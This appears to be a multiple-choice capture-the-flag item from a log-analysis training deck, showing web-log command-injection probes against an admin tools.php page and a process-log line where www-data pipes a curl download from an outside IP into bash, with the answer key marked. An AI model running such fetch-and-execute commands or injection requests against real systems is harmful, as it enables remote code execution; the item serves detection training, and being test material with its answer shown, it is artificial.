![image](https://github.com/user-attachments/assets/068fae26-6e8f-402f-ad69-63a4e6a1f59e)

# Medium CTF – Log Correlation Investigation

You are correlating web and system logs after suspicious outbound traffic was detected.

### Web log excerpt

```
GET /admin/tools.php?cmd=id HTTP/1.1
GET /admin/tools.php?cmd=whoami HTTP/1.1
```

### Process log excerpt (2 minutes later)

```
www-data  4021  /bin/bash -c curl http://198.51.100.7/payload.sh | bash
```

---

## Question

What phase of the attack is most likely happening here?

---

## Flags (Choose One)

- **A)** Initial reconnaissance
- **B)** Credential theft
- **C)** Exploitation followed by command execution
- **D)** Normal administrator troubleshooting

---

Correct Flag: **C**

---

# Finished?

[Next Question](SA_hard.md)

[Back to Card's Main Page](/Decks/CORE_v3.1/DET/Server_Analysis.md)
